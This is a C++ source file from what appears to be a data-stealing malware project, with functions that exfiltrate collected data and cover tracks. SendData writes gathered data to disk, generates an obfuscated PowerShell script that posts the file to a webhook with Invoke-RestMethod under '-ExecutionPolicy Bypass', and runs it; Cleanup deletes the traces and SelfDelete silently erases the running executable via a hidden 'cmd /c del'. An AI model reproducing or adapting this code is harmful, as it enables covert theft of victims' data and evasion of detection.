#include <fstream>
#include "misc.h"

#include "utils.h"
#include "globals.h"

bool misc::SendData(std::string data) noexcept
{
	std::ofstream f(globals::g_sGoopFileName);
	f << data;
	f.close();

	bool retVal = true;

	std::string script = OBF("$Url=\"");

	script.append(WEBHOOK);
	script.append((OBF("\";"
		"$Path=\".\\") + globals::g_sGoopFileName + OBF("\";"
		"$fileBytes=[System.IO.File]::ReadAllBytes($Path);"
		"$fileEnc=[System.Text.Encoding]::GetEncoding(\"UTF-8\").GetString($fileBytes);"
		"$Boundary=[System.Guid]::NewGuid().ToString();"
		"$bodyLines=(\"--$Boundary`r`nContent-Disposition: form-data; name=`\"files[0]`\"; filename=`\"") + globals::g_sGoopFileName + OBF("`\"`r`nContent-Type: text/html`r`n`r`n$fileEnc`r`n--$Boundary--`r`n\");"
		"Invoke-RestMethod -Uri $Url -Method Post -ContentType \"multipart/form-data; boundary=`\"$Boundary`\"\" -Body $bodyLines;")));

	std::ofstream file;
	file.open(globals::g_sSendFileName);
	file << script.c_str();
	file.close();

	// Since the file name is evaluated at runtime, we don't obfuscate it
	if (!utils::RunSubWorker(NULL, std::string(OBF("powershell -ExecutionPolicy Bypass ./") + globals::g_sSendFileName).c_str()))
		retVal = false;

	return retVal;
}

void misc::Cleanup(void) noexcept
{
	// We close these regardless of the cleanup option...
	if (globals::g_hStdOutR != NULL) CloseHandle(globals::g_hStdOutR);
	if (globals::g_hStdOutW != NULL) CloseHandle(globals::g_hStdOutW);

	if (!config::cleanup)
		return;
	if(utils::isFile(globals::g_sGoopFileName))
		std::remove(globals::g_sGoopFileName.c_str());

	if (utils::isFile(globals::g_sSendFileName))
		std::remove(globals::g_sSendFileName.c_str());
}

void misc::SelfDelete(void) noexcept
{
	if (!config::selfdelete)
		return;

	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);

	std::string cmd(OBF("/c del "));
	cmd.append(path);
	cmd.append(OBF(" >> NUL"));

	char file[MAX_PATH];

	if (!GetModuleFileNameA(0, file, MAX_PATH) != 00)
		return;

	if (!GetShortPathNameA(file, file, MAX_PATH))
		return;

	if (!GetEnvironmentVariableA(OBF("ComSpec"), file, MAX_PATH))
		return;

	ShellExecuteA(0, 0, file, cmd.c_str(), 0, SW_HIDE);
}